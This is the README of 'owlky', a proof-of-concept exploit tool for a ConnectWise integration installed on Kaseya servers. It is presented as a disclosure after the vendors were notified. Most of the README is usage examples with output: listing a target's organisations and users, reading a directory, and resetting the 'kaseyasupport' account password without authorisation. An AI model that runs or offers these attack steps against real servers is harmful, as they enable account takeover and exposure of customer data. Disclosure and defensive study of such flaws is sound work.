# owlky

What is this? This is a proof of concept exploit for a Kaseya & ConnectWise integration called ManagedITSync which allows ConnectWise to retrieve information about assets in your Kaseya database (to then generate Configurations in ConnectWise).

Specifically, this script targets the `KaseyaCwWebService/ManagedIT.asmx` endpoint which is installed on the Kaseya server. To be clear, this is not really an exploit with Kaseya's offering -- but rather the integration published by ConnectWise which happens to be installed on the Kaseya server.

I am releasing this for a few reasons:
* The interested vendors (ConnectWise and Kaseya) have been made aware of this for months. The vendor responsible (ConnectWise) has since pulled this integration from their Marketplace and published mitigation steps in the ConnectWise university ([here](https://docs.connectwise.com/ConnectWise_Documentation/140/Kaseya_-_IP_and_Domain_Restrictions)).
* I have been told by ConnectWise that an advisery has been sent to affected customers (including above mitigation steps)
* Since _certain parties_ are aware of this existing I believe that all potentially affected parties should be aware so that they can ensure their systems are properly secured (you know, in case they did not receive any advisories from ConnectWise)

#### Usage

A few things... here are some examples.

```
$ ./owlky.py help

               available commands:
   )\___/(     owlky.py server(s) check
  {(K)v(Y)}    owlky.py server(s) dir-c
   {| ~ |}     owlky.py server(s) reset-support
   {/ ^ \}     owlky.py server(s) list-orgs
    `m-m`      owlky.py server(s) list-users

```

```
$ ./owlky.py kaseya.example.com list-orgs

Found 4 orgs at kaseya.example.com:
 - <REDACTED>
 - <REDACTED>
 - <REDACTED>
 - <REDACTED>
```

```
$ ./owlky.py kaseya.example.com reset-support
 
Attempting to reset password for kaseyasupport to 9e531283
Successfully reset password.
```

```
$ ./owlky.py kaseya.example.com list-users
 
Found 5 users at kaseya.example.com:
 - <REDACTED> (email: <REDACTED>)
 - <REDACTED> (email: <REDACTED>)
 - <REDACTED> (email: <REDACTED>)
 - <REDACTED> (email: <REDACTED>)
 - <REDACTED> (email: <REDACTED>)
```
